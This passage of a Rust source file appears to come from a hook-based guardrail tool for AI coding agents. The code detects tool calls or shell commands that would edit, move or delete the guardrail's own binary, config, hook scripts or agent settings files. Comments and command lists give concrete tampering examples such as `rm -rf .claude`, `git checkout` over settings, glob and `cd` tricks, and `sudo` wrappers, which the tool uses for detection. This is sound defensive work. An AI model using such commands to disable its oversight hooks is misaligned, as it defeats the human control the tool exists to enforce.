//! Self-protection target paths and labels.
//!
//! [`ProtectedPaths`] is built once per [`crate::engine::Engine`] from
//! the resolved config + repo root and consulted by the engine's
//! `decide` to populate [`crate::facts::Facts::protected`]. The actual
//! `core.self_protection.*` rules live in `crate::rules::self_protection`.

use std::path::{Path, PathBuf};
use std::{fs, io::ErrorKind};

use crate::config::Config;
use crate::config::scope::{EnvLookup, SystemEnv, layout_for};
use crate::hook_input::HookInput;
use serde_json::Value;

/// Categories of protected target. Paired with a path on every
/// [`crate::facts::Facts::protected`] entry so rules can produce specific reasons.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum ProtectedKind {
    Binary,
    Config,
    Plugin,
    ClaudeSettings,
    CodexSettings,
    HookScript,
    CopilotSettings,
    KiroSettings,
    PiSettings,
    OpencodeSettings,
    CursorSettings,
    ClineSettings,
}

impl ProtectedKind {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Binary => "binary",
            Self::Config => "config",
            Self::Plugin => "plugin",
            Self::ClaudeSettings => "claude_settings",
            Self::CodexSettings => "codex_settings",
            Self::HookScript => "hook_script",
            Self::CopilotSettings => "copilot_settings",
            Self::KiroSettings => "kiro_settings",
            Self::PiSettings => "pi_settings",
            Self::OpencodeSettings => "opencode_settings",
            Self::CursorSettings => "cursor_settings",
            Self::ClineSettings => "cline_settings",
        }
    }
}

/// Small, allocation-free set of protected target labels.
///
/// There are only twelve [`ProtectedKind`] variants, so a fixed buffer is
/// simpler than pulling in a small-vector dependency for the hook hot path.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct ProtectedKinds {
    kinds: [ProtectedKind; Self::CAPACITY],
    len: usize,
}

impl ProtectedKinds {
    const CAPACITY: usize = 12;

    pub fn new() -> Self {
        Self::default()
    }

    pub fn push_unique(&mut self, kind: ProtectedKind) {
        if self.contains(&kind) {
            return;
        }
        if self.len < Self::CAPACITY {
            self.kinds[self.len] = kind;
            self.len += 1;
        }
    }

    pub fn contains(&self, kind: &ProtectedKind) -> bool {
        self.as_slice().contains(kind)
    }

    pub fn is_empty(&self) -> bool {
        self.len == 0
    }

    pub fn iter(&self) -> impl Iterator<Item = &ProtectedKind> {
        self.as_slice().iter()
    }

    pub fn as_slice(&self) -> &[ProtectedKind] {
        &self.kinds[..self.len]
    }
}

impl Default for ProtectedKinds {
    fn default() -> Self {
        Self {
            kinds: [ProtectedKind::Binary; Self::CAPACITY],
            len: 0,
        }
    }
}

impl From<&[ProtectedKind]> for ProtectedKinds {
    fn from(kinds: &[ProtectedKind]) -> Self {
        let mut out = Self::new();
        for kind in kinds {
            out.push_unique(*kind);
        }
        out
    }
}

/// Resolved set of paths whose modification ptuf treats as a
/// guardrail-bypass attempt.
#[derive(Debug, Clone, Default)]
pub struct ProtectedPaths {
    pub repo_root: Option<PathBuf>,
    pub binary: Option<PathBuf>,
    pub configs: Vec<PathBuf>,
    pub plugins: Vec<PathBuf>,
    pub claude_settings: Vec<PathBuf>,
    pub codex_settings: Vec<PathBuf>,
    pub hook_scripts: Vec<PathBuf>,
    pub copilot_settings: Vec<PathBuf>,
    pub kiro_settings: Vec<PathBuf>,
    pub pi_settings: Vec<PathBuf>,
    pub opencode_settings: Vec<PathBuf>,
    pub cursor_settings: Vec<PathBuf>,
    pub cline_settings: Vec<PathBuf>,
}

impl ProtectedPaths {
    /// Build the protected set from the resolved engine state.
    pub fn collect(repo_root: Option<&Path>, config: &Config) -> Self {
        Self::collect_with_env(repo_root, config, &SystemEnv)
    }

    /// Hermetic variant used by tests; collapses to [`Self::collect`]
    /// in production via the [`SystemEnv`] lookup.
    pub(crate) fn collect_with_env(
        repo_root: Option<&Path>,
        config: &Config,
        env: &dyn EnvLookup,
    ) -> Self {
        let layout = layout_for(repo_root, env);
        let mut configs: Vec<PathBuf> = layout.ordered_paths();
        // Deduplicate while preserving order.
        configs.sort();
        configs.dedup();

        let mut claude_settings: Vec<PathBuf> = Vec::new();
        if let Some(root) = repo_root {
            claude_settings.push(root.join(".claude/settings.json"));
            claude_settings.push(root.join(".claude/settings.local.json"));
        }
        if let Some(home_os) = env.var_os("HOME") {
            let home = PathBuf::from(home_os);
            claude_settings.push(home.join(".claude/settings.json"));
        }
        claude_settings.sort();
        claude_settings.dedup();

        let mut codex_settings: Vec<PathBuf> = Vec::new();
        if let Some(root) = repo_root {
            codex_settings.push(root.join(".codex/config.toml"));
            codex_settings.push(root.join(".codex/hooks.json"));
        }
        if let Some(home_os) = env.var_os("HOME") {
            let home = PathBuf::from(home_os);
            codex_settings.push(home.join(".codex/config.toml"));
            codex_settings.push(home.join(".codex/hooks.json"));
        }
        codex_settings.sort();
        codex_settings.dedup();

        let mut hook_scripts = Vec::new();
        for settings_path in &claude_settings {
            let body = match fs::read_to_string(settings_path) {
                Ok(s) => s,
                Err(err) if err.kind() == ErrorKind::NotFound => continue,
                Err(_) => continue,
            };
            let parsed: Value = match serde_json::from_str(&body) {
                Ok(value) => value,
                Err(_) => continue,
            };
            for command in crate::init::claude_code::pre_tool_use_commands(&parsed) {
                let Some(executable) = crate::init::command_executable(&command) else {
                    continue;
                };
                let normalized = crate::facts::path::resolve_with_env(
                    executable,
                    repo_root.or_else(|| settings_path.parent()),
                    env,
                );
                if !hook_scripts.contains(&normalized) {
                    hook_scripts.push(normalized);
                }
            }
        }
        for hooks_path in codex_settings.iter().filter(|path| {
            path.file_name()
                .and_then(|name| name.to_str())
                .is_some_and(|name| name == "hooks.json")
        }) {
            let body = match fs::read_to_string(hooks_path) {
                Ok(s) => s,
                Err(err) if err.kind() == ErrorKind::NotFound => continue,
                Err(_) => continue,
            };
            let parsed: Value = match serde_json::from_str(&body) {
                Ok(value) => value,
                Err(_) => continue,
            };
            for command in crate::init::codex::pre_tool_use_commands(&parsed) {
                let Some(executable) = crate::init::command_executable(&command) else {
                    continue;
                };
                let normalized = crate::facts::path::resolve_with_env(
                    executable,
                    repo_root.or_else(|| hooks_path.parent()),
                    env,
                );
                if !hook_scripts.contains(&normalized) {
                    hook_scripts.push(normalized);
                }
            }
        }

        let mut copilot_settings: Vec<PathBuf> = Vec::new();
        if let Some(root) = repo_root {
            copilot_settings.push(root.join(".github/hooks/ptuf.json"));
        }

        for hooks_path in &copilot_settings {
            let body = match fs::read_to_string(hooks_path) {
                Ok(s) => s,
                Err(err) if err.kind() == ErrorKind::NotFound => continue,
                Err(_) => continue,
            };
            let parsed: Value = match serde_json::from_str(&body) {
                Ok(v) => v,
                Err(_) => continue,
            };
            for command in crate::init::copilot::pre_tool_use_commands(&parsed) {
                let Some(executable) = crate::init::command_executable(&command) else {
                    continue;
                };
                let normalized = crate::facts::path::resolve_with_env(
                    executable,
                    repo_root.or_else(|| hooks_path.parent()),
                    env,
                );
                if !hook_scripts.contains(&normalized) {
                    hook_scripts.push(normalized);
                }
            }
        }

        let home_path = env.var_os("HOME").map(PathBuf::from);
        let kiro_settings = collect_kiro_paths(repo_root, home_path.as_deref());
        let pi_settings = collect_pi_paths(repo_root, home_path.as_deref());
        let opencode_settings = collect_opencode_paths(repo_root, home_path.as_deref(), env);
        let cursor_settings = collect_cursor_paths(repo_root, home_path.as_deref());
        let cline_settings = collect_cline_paths(repo_root, home_path.as_deref());

        for hooks_path in &cursor_settings {
            let Ok(body) = fs::read_to_string(hooks_path) else {
                continue;
            };
            let Ok(parsed): Result<Value, _> = serde_json::from_str(&body) else {
                continue;
            };
            for command in crate::init::cursor::pre_tool_use_commands(&parsed) {
                let Some(executable) = crate::init::command_executable(&command) else {
                    continue;
                };
                let normalized = crate::facts::path::resolve_with_env(
                    executable,
                    repo_root.or_else(|| hooks_path.parent()),
                    env,
                );
                if !hook_scripts.contains(&normalized) {
                    hook_scripts.push(normalized);
                }
            }
        }

        for agent_path in &kiro_settings {
            // `collect_kiro_paths` enumerates via `read_dir` (plus the
            // managed `ptuf.json`, which may be absent); treat read /
            // parse failures uniformly as "skip this scope" so a TOCTOU
            // race (file removed between enumeration and now) collapses
            // into the same control flow as malformed JSON.
            let Ok(body) = fs::read_to_string(agent_path) else {
                continue;
            };
            let Ok(parsed): Result<Value, _> = serde_json::from_str(&body) else {
                continue;
            };
            // v2 profiles nest commands under `hooks.preToolUse`; v3
            // hook documents and current profiles use a `hooks` array.
            let commands = crate::init::kiro::pre_tool_use_commands(&parsed)
                .into_iter()
                .chain(crate::init::kiro_v3::pre_tool_use_commands(&parsed));
            for command in commands {
                let Some(executable) = crate::init::command_executable(&command) else {
                    continue;
                };
                let normalized = crate::facts::path::resolve_with_env(
                    executable,
                    repo_root.or_else(|| agent_path.parent()),
                    env,
                );
                if !hook_scripts.contains(&normalized) {
                    hook_scripts.push(normalized);
                }
            }
        }

        // Pre-cache `canonical_or_raw` on every target list so
        // `match_path` only canonicalises the candidate. Symlinks
        // collapse for files that exist; non-existent targets keep
        // their raw form, which still matches a likewise non-existent
        // candidate via byte equality.
        let binary = std::env::current_exe()
            .ok()
            .map(|p| p.canonicalize().unwrap_or(p));
        let configs = canonicalize_each(configs);
        let plugins = canonicalize_each(config.plugin_paths.clone());
        let claude_settings = canonicalize_each(claude_settings);
        let codex_settings = canonicalize_each(codex_settings);
        let hook_scripts = canonicalize_each(hook_scripts);
        let copilot_settings = canonicalize_each(copilot_settings);
        let kiro_settings = canonicalize_each(kiro_settings);
        let pi_settings = canonicalize_each(pi_settings);
        let opencode_settings = canonicalize_each(opencode_settings);
        let cursor_settings = canonicalize_each(cursor_settings);
        let cline_settings = canonicalize_each(cline_settings);

        Self {
            repo_root: repo_root.map(Path::to_path_buf),
            binary,
            configs,
            plugins,
            claude_settings,
            codex_settings,
            hook_scripts,
            copilot_settings,
            kiro_settings,
            pi_settings,
            opencode_settings,
            cursor_settings,
            cline_settings,
        }
    }

    /// Classify a `HookInput` against the protected set, returning the
    /// matched labels. Empty set means "no self-protection match".
    ///
    /// This extracts path facts itself. The engine, which has already
    /// extracted them (and parsed the Bash command), calls
    /// [`Self::classify_input_prepared`] instead.
    pub fn classify_input(&self, input: &HookInput) -> ProtectedKinds {
        let paths = crate::facts::path::extract_all(input);
        self.classify_input_prepared(input, &paths, &[], None)
    }

    /// Classify the union of `paths` (tool-input derived) and `extra`
    /// (engine-supplied, e.g. Bash redirect targets) without forcing
    /// the caller to allocate a merged `Vec`, reusing an already-parsed
    /// Bash command (`facts.bash`) so the engine's hot path never
    /// parses the same command line twice. Pass `None` for `bash` to
    /// fall back to parsing the payload's `command` string internally.
    pub(crate) fn classify_input_prepared(
        &self,
        input: &HookInput,
        paths: &[crate::facts::path::FilePath],
        extra: &[crate::facts::path::FilePath],
        bash: Option<&crate::facts::shell::Bash>,
    ) -> ProtectedKinds {
        let mut out = ProtectedKinds::new();
        let cwd = if self.repo_root.is_none() {
            std::env::current_dir().ok()
        } else {
            None
        };
        let base_dir = self.repo_root.as_deref().or(cwd.as_deref());
        let candidates = candidate_targets(input, paths.iter().chain(extra.iter()), base_dir, bash);
        for cand in &candidates {
            let kind = match cand {
                Candidate::Exact(p) => self.match_path(p),
                Candidate::Ancestor(p) => self.match_path(p).or_else(|| self.match_descendant(p)),
                Candidate::Basename(name) => self.match_basename(name),
                Candidate::Suffix(tail) => self.match_suffix(tail),
                Candidate::Glob(pattern, tree) => self.match_glob(pattern, *tree),
            };
            if let Some(kind) = kind {
                out.push_unique(kind);
            }
        }
        out
    }

    /// Every protected path, tagged with its kind, in `match_path` order.
    fn tagged_targets(&self) -> impl Iterator<Item = (ProtectedKind, &Path)> {
        let lists: [(ProtectedKind, &[PathBuf]); 11] = [
            (ProtectedKind::Config, &self.configs),
            (ProtectedKind::Plugin, &self.plugins),
            (ProtectedKind::ClaudeSettings, &self.claude_settings),
            (ProtectedKind::CodexSettings, &self.codex_settings),
            (ProtectedKind::CopilotSettings, &self.copilot_settings),
            (ProtectedKind::KiroSettings, &self.kiro_settings),
            (ProtectedKind::PiSettings, &self.pi_settings),
            (ProtectedKind::OpencodeSettings, &self.opencode_settings),
            (ProtectedKind::CursorSettings, &self.cursor_settings),
            (ProtectedKind::ClineSettings, &self.cline_settings),
            (ProtectedKind::HookScript, &self.hook_scripts),
        ];
        self.binary
            .iter()
            .map(|b| (ProtectedKind::Binary, b.as_path()))
            .chain(
                lists
                    .into_iter()
                    .flat_map(|(kind, paths)| paths.iter().map(move |p| (kind, p.as_path()))),
            )
    }

    /// A protected path lives *under* `dir`, so removing or moving `dir`
    /// (`rm -rf .claude`, `mv ~/.config/ptuf x`) takes it along.
    fn match_descendant(&self, dir: &Path) -> Option<ProtectedKind> {
        let lexical = lexical_normalize(dir);
        // `/` and `$HOME` are `core.filesystem.destructive-rm`'s domain;
        // claiming them here would only shadow that rule's reason.
        let home =
            crate::facts::path::resolve_with_env("~", None, &crate::config::scope::SystemEnv);
        if lexical.parent().is_none() || lexical == home {
            return None;
        }
        let canonical = dir.canonicalize().ok();
        self.tagged_targets()
            .find(|(_, target)| {
                (target.starts_with(&lexical) && *target != lexical)
                    || canonical
                        .as_deref()
                        .is_some_and(|c| target.starts_with(c) && *target != c)
            })
            .map(|(kind, _)| kind)
    }

    fn match_suffix(&self, tail: &Path) -> Option<ProtectedKind> {
        self.tagged_targets()
            .find(|(_, target)| target.ends_with(tail))
            .map(|(kind, _)| kind)
    }

    fn match_glob(&self, pattern: &Path, tree: bool) -> Option<ProtectedKind> {
        let pattern = lexical_normalize(pattern);
        self.tagged_targets()
            .find(|(_, target)| path_glob_matches(&pattern, target, tree))
            .map(|(kind, _)| kind)
    }

    /// A relative write after a `cd` ptuf could not follow (`cd $X`,
    /// `cd -`): match on the file name alone.
    fn match_basename(&self, name: &std::ffi::OsStr) -> Option<ProtectedKind> {
        self.tagged_targets()
            .find(|(_, target)| target.file_name() == Some(name))
            .map(|(kind, _)| kind)
    }

    fn match_path(&self, candidate: &Path) -> Option<ProtectedKind> {
        // `candidate` is constant across every target list, so its
        // `canonicalize` (a syscall) is computed lazily at most once
        // per call instead of once per (candidate, target) pair.
        let mut canon: Option<Option<PathBuf>> = None;
        let mut matches = |target: &Path| {
            if candidate == target {
                return true;
            }
            canon
                .get_or_insert_with(|| candidate.canonicalize().ok())
                .as_deref()
                == Some(target)
        };
        if let Some(b) = &self.binary
            && matches(b)
        {
            return Some(ProtectedKind::Binary);
        }
        if self.configs.iter().any(|p| matches(p)) {
            return Some(ProtectedKind::Config);
        }
        if self.plugins.iter().any(|p| matches(p)) {
            return Some(ProtectedKind::Plugin);
        }
        if self.claude_settings.iter().any(|p| matches(p)) {
            return Some(ProtectedKind::ClaudeSettings);
        }
        if self.codex_settings.iter().any(|p| matches(p)) {
            return Some(ProtectedKind::CodexSettings);
        }
        if self.copilot_settings.iter().any(|p| matches(p)) {
            return Some(ProtectedKind::CopilotSettings);
        }
        if self.kiro_settings.iter().any(|p| matches(p)) {
            return Some(ProtectedKind::KiroSettings);
        }
        if self.pi_settings.iter().any(|p| matches(p)) {
            return Some(ProtectedKind::PiSettings);
        }
        if self.opencode_settings.iter().any(|p| matches(p)) {
            return Some(ProtectedKind::OpencodeSettings);
        }
        if self.cursor_settings.iter().any(|p| matches(p)) {
            return Some(ProtectedKind::CursorSettings);
        }
        if self.cline_settings.iter().any(|p| matches(p)) {
            return Some(ProtectedKind::ClineSettings);
        }
        if self.hook_scripts.iter().any(|p| matches(p)) {
            return Some(ProtectedKind::HookScript);
        }
        None
    }
}

/// Kiro hook registration files in the repo and `$HOME` scopes: every
/// `*.json` directly under `.kiro/agents/` (v2 profiles, and v3 profiles
/// with inline hooks) and `.kiro/hooks/` (v3 standalone hook documents),
/// plus the `.kiro/hooks/ptuf.json` that `ptuf init kiro-v3` manages even
/// before it exists. Missing directories are silently skipped so the
/// protected set degrades gracefully when `ptuf init kiro` has not yet
/// been run, rather than locking unknown legacy paths.
fn collect_kiro_paths(repo_root: Option<&Path>, home: Option<&Path>) -> Vec<PathBuf> {
    let mut roots = Vec::new();

    if let Some(root) = repo_root {
        roots.push(root);
    }

    if let Some(home) = home {
        roots.push(home);
    }

    let mut paths = Vec::new();

    for root in roots {
        let hooks_dir = root.join(crate::init::kiro_v3::HOOKS_DIR);
        paths.push(hooks_dir.join(crate::init::kiro_v3::HOOK_FILE_NAME));
        for dir in [root.join(".kiro/agents"), hooks_dir] {
            let Ok(entries) = std::fs::read_dir(&dir) else {
                continue;
            };

            for entry in entries.flatten() {
                let path = entry.path();
                if path.extension().and_then(std::ffi::OsStr::to_str) == Some("json") {
                    paths.push(path);
                }
            }
        }
    }

    paths.sort();
    paths.dedup();
    paths
}

fn collect_pi_paths(repo_root: Option<&Path>, home: Option<&Path>) -> Vec<PathBuf> {
    let mut paths = Vec::new();
    if let Some(home) = home {
        let agent = home.join(".pi/agent");
        paths.push(agent.join("settings.json"));
        paths.push(agent.join("extensions/ptuf.ts"));
        paths.push(agent.join("extensions/ptuf/index.ts"));
    }
    if let Some(root) = repo_root {
        let pi = root.join(".pi");
        paths.push(pi.join("settings.json"));
        paths.push(pi.join("extensions/ptuf.ts"));
        paths.push(pi.join("extensions/ptuf/index.ts"));
    }
    paths.sort();
    paths.dedup();
    paths
}

fn collect_opencode_paths(
    repo_root: Option<&Path>,
    home: Option<&Path>,
    env: &dyn EnvLookup,
) -> Vec<PathBuf> {
    let mut paths = Vec::new();
    if let Some(xdg) = env.var_os("XDG_CONFIG_HOME") {
        let config = PathBuf::from(xdg).join("opencode");
        paths.push(config.join("plugins/ptuf.ts"));
        paths.push(config.join("plugin/ptuf.ts"));
    } else if let Some(home) = home {
        let config = home.join(".config/opencode");
        paths.push(config.join("plugins/ptuf.ts"));
        paths.push(config.join("plugin/ptuf.ts"));
    }
    if let Some(root) = repo_root {
        let config = root.join(".opencode");
        paths.push(config.join("plugins/ptuf.ts"));
        paths.push(config.join("plugin/ptuf.ts"));
    }
    paths.sort();
    paths.dedup();
    paths
}

/// `.cursor/hooks.json` in the repo and `$HOME` scopes — the two files
/// `ptuf init cursor --scope local|global` patches.
fn collect_cursor_paths(repo_root: Option<&Path>, home: Option<&Path>) -> Vec<PathBuf> {
    let mut paths = Vec::new();
    if let Some(root) = repo_root {
        paths.push(root.join(crate::init::cursor::DEFAULT_HOOKS_PATH));
    }
    if let Some(home) = home {
        paths.push(home.join(crate::init::cursor::DEFAULT_HOOKS_PATH));
    }
    paths.sort();
    paths.dedup();
    paths
}

/// Cline `PreToolUse` wrapper scripts written by `ptuf init cline`.
/// Cline file hooks are executables identified by file name, so the
/// wrapper itself is the registration. Both the Unix and Windows
/// (`.ps1`) names are protected regardless of the host platform: a
/// cross-platform checkout still carries whichever one Cline runs.
fn collect_cline_paths(repo_root: Option<&Path>, home: Option<&Path>) -> Vec<PathBuf> {
    use crate::init::cline::{GLOBAL_HOOKS_DIR, HOOK_FILE_NAMES, REPO_HOOKS_DIR};
    let dirs = [
        repo_root.map(|root| root.join(REPO_HOOKS_DIR)),
        home.map(|home| home.join(GLOBAL_HOOKS_DIR)),
    ];
    let mut paths: Vec<PathBuf> = dirs
        .iter()
        .flatten()
        .flat_map(|dir| HOOK_FILE_NAMES.iter().map(move |name| dir.join(name)))
        .collect();
    paths.sort();
    paths.dedup();
    paths
}

/// Replace each entry with its `canonicalize().unwrap_or(self)` form
/// so the target side never re-canonicalises during match-time. The
/// helper is shared across every protected list; non-existent targets
/// keep their raw form, which still matches a likewise non-existent
/// candidate via byte equality.
fn canonicalize_each(paths: Vec<PathBuf>) -> Vec<PathBuf> {
    paths
        .into_iter()
        .map(|p| p.canonicalize().unwrap_or(p))
        .collect()
}

/// A path a hook call may write, and how it relates to protected paths.
enum Candidate {
    /// Written as is (`Write::file_path`, `cp x DEST`, `> DEST`).
    Exact(PathBuf),
    /// Removed or moved with everything under it (`rm -rf DIR`, `mv DIR
    /// x`): a protected path below it counts too.
    Ancestor(PathBuf),
    /// A relative path written after an unresolvable `cd`; only its file
    /// name is known.
    Basename(std::ffi::OsString),
    /// A path whose leading part is decided at run time (`$DIR/.claude/
    /// settings.json`): the literal trailing components must end a
    /// protected path.
    Suffix(PathBuf),
    /// A path with shell glob characters (`.clau*/settings.json`), which
    /// bash expands before the write; matched against protected paths
    /// component by component. The flag marks a tree writer (`rm -rf
    /// .c*`), which also takes everything under a matching directory.
    Glob(PathBuf, bool),
}

/// Writer heads whose positional arguments are write targets.
const WRITER_HEADS: &[&str] = &["rm", "mv", "cp", "chmod", "chown", "tee", "ln", "sed"];

/// Writer heads that rewrite their file arguments in place:
/// `sponge FILE`, `patch FILE`, `ed FILE`, `ex FILE`.
const EDITOR_WRITER_HEADS: &[&str] = &["sponge", "patch", "ed", "ex"];

/// Whether this interpreter call edits its file arguments in place:
/// `awk -i inplace …` / `gawk -i inplace …`, `perl -i …` / `perl -pi
/// …`, `ruby -i …`.
fn edits_in_place(argv: &crate::facts::shell::Argv) -> bool {
    match argv.head_basename() {
        "awk" | "gawk" => {
            argv.args
                .windows(2)
                .any(|w| w[0] == "-i" && w[1] == "inplace")
                || argv
                    .args
                    .iter()
                    .any(|a| a == "-iinplace" || a == "--include=inplace")
        },
        "perl" | "ruby" => argv
            .args
            .iter()
            .any(|a| a.starts_with('-') && !a.starts_with("--") && a.contains('i')),
        _ => false,
    }
}

/// Writer heads that remove or move a directory tree.
const TREE_WRITER_HEADS: &[&str] = &["rm", "mv"];

/// `git` subcommands that overwrite or remove their pathspec arguments
/// (`git checkout HEAD~5 -- .claude/settings.json`, `git rm FILE`).
const GIT_PATH_WRITERS: &[&str] = &["checkout", "restore", "rm", "mv"];

fn candidate_targets<'a>(
    input: &HookInput,
    paths: impl IntoIterator<Item = &'a crate::facts::path::FilePath>,
    base_dir: Option<&Path>,
    bash: Option<&crate::facts::shell::Bash>,
) -> Vec<Candidate> {
    let event = input.event();
    let mut out = Vec::new();
    // Edit / Write / Read all expose `file_path`.
    for fp in paths {
        if fp.absolute.is_relative() {
            if let Some(base) = base_dir {
                out.push(Candidate::Exact(base.join(&fp.absolute)));
            } else {
                out.push(Candidate::Exact(fp.absolute.clone()));
            }
        } else {
            out.push(Candidate::Exact(fp.absolute.clone()));
        }
    }
    // Bash invocations carry destinations as positional args; collect
    // every positional that looks like a path. Don't try to interpret
    // the command itself — false positives are cheap (we reject), but
    // missing a target can let an unsafe write through.
    if let Some(cmd) = event.command {
        // Reuse the caller's parsed pipeline when available; parsing
        // here is the fallback for entry points that only hold the raw
        // payload.
        let parsed;
        let bash = if let Some(b) = bash {
            b
        } else {
            parsed = crate::facts::shell::parse(cmd);
            &parsed
        };
        bash_candidates(bash, base_dir, &mut out);
    }
    out
}

/// Walk the Bash segments in order, following literal `cd` / `pushd`
/// so later relative paths resolve against the directory the shell is
/// actually in (`cd .claude && echo {} > settings.json`).
fn bash_candidates(
    bash: &crate::facts::shell::Bash,
    base_dir: Option<&Path>,
    out: &mut Vec<Candidate>,
) {
    let env = &crate::config::scope::SystemEnv;
    let mut cwd: Option<PathBuf> = base_dir.map(Path::to_path_buf);
    // Set once a `cd` target is not a literal path.
    let mut lost_cwd = false;
    let push = |raw: &str, cwd: Option<&Path>, lost: bool, tree: bool, out: &mut Vec<Candidate>| {
        let expanded = expand_cwd_references(raw, cwd);
        let raw = expanded.as_str();
        if let Some(name) = which_lookup(raw) {
            out.push(Candidate::Basename(name.into()));
            return;
        }
        let resolved = crate::facts::path::resolve_with_env(raw, cwd, env);
        if let Some(tail) = literal_tail(raw) {
            out.push(Candidate::Suffix(tail));
        }
        if raw.contains(['*', '?', '[']) {
            out.push(Candidate::Glob(resolved.clone(), tree));
        }
        if lost
            && !Path::new(raw).is_absolute()
            && !raw.starts_with(['~', '$'])
            && let Some(name) = Path::new(raw).file_name()
        {
            out.push(Candidate::Basename(name.to_os_string()));
        }
        out.push(if tree {
            Candidate::Ancestor(resolved)
        } else {
            Candidate::Exact(resolved)
        });
    };
    for pipe in &bash.segments {
        let mut cmds = Vec::new();
        for c in &pipe.commands {
            c.collect_commands(&mut cmds);
        }
        for outer in cmds {
            // Peel a privilege-escalation wrapper (`sudo rm ...`) so the
            // writer head and its destinations are the inner command's.
            let argv = crate::facts::shell::unwrap_all_prefix_wrappers(outer);
            let head = argv.head_basename();
            if matches!(head, "cd" | "pushd") {
                match argv.positional().next() {
                    Some(dir)
                        if !dir.starts_with('$') && dir != "-" && !dir.starts_with(['+', '-']) =>
                    {
                        let next = crate::facts::path::resolve_with_env(dir, cwd.as_deref(), env);
                        cwd = Some(next);
                    },
                    Some(_) => lost_cwd = true,
                    // Bare `cd` goes home.
                    None => cwd = Some(crate::facts::path::resolve_with_env("~", None, env)),
                }
                continue;
            }
            if WRITER_HEADS.contains(&head)
                || EDITOR_WRITER_HEADS.contains(&head)
                || edits_in_place(&argv)
            {
                let tree = TREE_WRITER_HEADS.contains(&head);
                for a in argv.positional() {
                    push(a, cwd.as_deref(), lost_cwd, tree, out);
                }
            }
            for a in fetcher_outputs(&argv) {
                push(&a, cwd.as_deref(), lost_cwd, false, out);
            }
            for a in git_path_writes(&argv) {
                push(a, cwd.as_deref(), lost_cwd, false, out);
            }
        }
        // Redirect targets in this segment, resolved against the
        // followed cwd (the engine's own redirect facts use the root).
        // Dynamic or glob targets need the same treatment even at the
        // root.
        let moved = cwd.as_deref() != base_dir || lost_cwd;
        for r in &pipe.redirects {
            if !matches!(r.op, crate::facts::shell::RedirectOp::Heredoc)
                && !r.target.is_empty()
                && (moved || r.target.contains(['$', '*', '?', '[']))
            {
                push(&r.target, cwd.as_deref(), lost_cwd, false, out);
            }
        }
    }
}

/// Files a downloader writes: `curl -o` / `--output` (and `-O` /
/// `--remote-name` as the URL basename, under `--output-dir`), `wget -O`
/// / `--output-document` (or the URL basename under `-P`), `aria2c -o`
/// under `-d`.
fn fetcher_outputs(argv: &crate::facts::shell::Argv) -> Vec<String> {
    let head = argv.head_basename();
    if !matches!(head, "curl" | "wget" | "aria2c") {
        return Vec::new();
    }
    let mut files = Vec::new();
    let mut dir: Option<String> = None;
    let mut remote_name = head == "wget";
    let mut iter = argv.args.iter();
    while let Some(arg) = iter.next() {
        let a = arg.as_str();
        let (name, inline) = match a.split_once('=') {
            Some((n, v)) if n.starts_with("--") => (n, Some(v.to_owned())),
            _ => (a, None),
        };
        let mut value = || inline.clone().or_else(|| iter.next().cloned());
        match (head, name) {
            ("curl", "-o" | "--output")
            | ("wget", "-O" | "--output-document")
            | ("aria2c", "-o" | "--out") => {
                if let Some(v) = value() {
                    files.push(v);
                }
                remote_name = false;
            },
            ("curl", "-O" | "--remote-name") => remote_name = true,
            ("curl", "--output-dir")
            | ("wget", "-P" | "--directory-prefix")
            | ("aria2c", "-d" | "--dir") => {
                dir = value();
            },
            ("curl", s) if s.starts_with("-o") && s.len() > 2 && !s.starts_with("--") => {
                files.push(s[2..].to_owned())
            },
            ("wget", s) if s.starts_with("-O") && s.len() > 2 => files.push(s[2..].to_owned()),
            _ => {},
        }
    }
    if remote_name && files.is_empty() {
        files.extend(
            argv.positional()
                .filter_map(|u| u.split_once("://").map(|(_, rest)| rest))
                .filter_map(|rest| rest.split(['?', '#']).next())
                .filter_map(|p| p.split_once('/').map(|(_, path)| path))
                .filter_map(|path| path.rsplit('/').next())
                .filter(|b| !b.is_empty())
                .map(str::to_owned),
        );
    }
    files
        .into_iter()
        .filter(|f| f != "-")
        .map(|f| match &dir {
            Some(d) if !Path::new(&f).is_absolute() => format!("{d}/{f}"),
            _ => f,
        })
        .collect()
}

/// Pathspec arguments of a git subcommand that overwrites or removes
/// files: every positional after the subcommand (revisions resolve to
/// paths that are not protected, so over-collecting is harmless).
fn git_path_writes(argv: &crate::facts::shell::Argv) -> Vec<&str> {
    if argv.head_basename() != "git" {
        return Vec::new();
    }
    let mut words = argv.args.iter().map(String::as_str);
    // Skip global options (`-C dir`, `-c k=v`) up to the subcommand.
    let sub = loop {
        match words.next() {
            Some("-C" | "-c" | "--git-dir" | "--work-tree" | "--namespace") => {
                words.next();
            },
            Some(a) if a.starts_with('-') => {},
            Some(a) => break a,
            None => return Vec::new(),
        }
    };
    if !GIT_PATH_WRITERS.contains(&sub) {
        return Vec::new();
    }
    let mut out = Vec::new();
    let mut after_dashdash = false;
    let mut rest = words;
    while let Some(a) = rest.next() {
        if !after_dashdash {
            if a == "--" {
                after_dashdash = true;
                continue;
            }
            if matches!(
                a,
                "-s" | "--source" | "-b" | "-B" | "--orphan" | "--pathspec-from-file"
            ) {
                rest.next();
                continue;
            }
            if a.starts_with('-') {
                continue;
            }
        }
        out.push(a);
    }
    out
}

/// Replace references to the current directory (`$PWD`, `${PWD}`,
/// `$(pwd)`) with the directory the shell is in.
fn expand_cwd_references(raw: &str, cwd: Option<&Path>) -> String {
    let Some(cwd) = cwd.and_then(Path::to_str) else {
        return raw.to_owned();
    };
    let mut out = raw.to_owned();
    for token in ["${PWD}", "$(pwd)", "$(pwd -P)", "$(pwd -L)"] {
        out = out.replace(token, cwd);
    }
    // `$PWD` only when not the prefix of a longer name (`$PWDX`).
    let mut result = String::with_capacity(out.len());
    let mut rest = out.as_str();
    while let Some(pos) = rest.find("$PWD") {
        let after = &rest[pos + 4..];
        result.push_str(&rest[..pos]);
        if after.starts_with(|c: char| c.is_ascii_alphanumeric() || c == '_') {
            result.push_str("$PWD");
        } else {
            result.push_str(cwd);
        }
        rest = after;
    }
    result.push_str(rest);
    result
}

/// `$(which X)` / `$(command -v X)` / `$(type -P X)` as a whole word:
/// the command `X` resolves to, known here only by name.
fn which_lookup(raw: &str) -> Option<&str> {
    let inner = raw.strip_prefix("$(")?.strip_suffix(')')?;
    let mut words = inner.split_whitespace();
    let name = match (words.next()?, words.next()?) {
        ("which", name) => name,
        ("command", "-v") | ("type", "-P" | "-p") => words.next()?,
        _ => return None,
    };
